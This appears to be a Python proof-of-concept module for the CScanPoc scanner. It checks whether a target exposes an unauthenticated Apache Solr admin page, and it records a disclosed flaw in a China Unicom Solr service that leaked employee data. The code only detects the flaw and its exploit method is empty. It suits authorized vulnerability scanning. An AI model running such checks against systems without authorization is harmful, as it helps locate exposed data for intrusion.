# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '6302298e-b105-4f59-901e-75d290a0baa9'
    name = '中国联通某solr服务未授权访问漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-05-18'  # 漏洞公布时间
    desc = '''
        中国联通某solr服务未授权访问，泄露员工信息。索引数据库为iwo_ad、iwo_agency、iwo_user、iwo_video。联通的沃业务相关服务器
        而且C段几乎全是联通的业务。
    ''' # 漏洞描述
    ref = 'https://www.secpulse.com/archives/31908.html' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0105302
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '中国联通'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '92d19389-484d-42ca-8395-056c9a44e7d3'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/solr/#/'
            url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(url)                  
            if code == 200 and  'Apache SOLR' in res :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()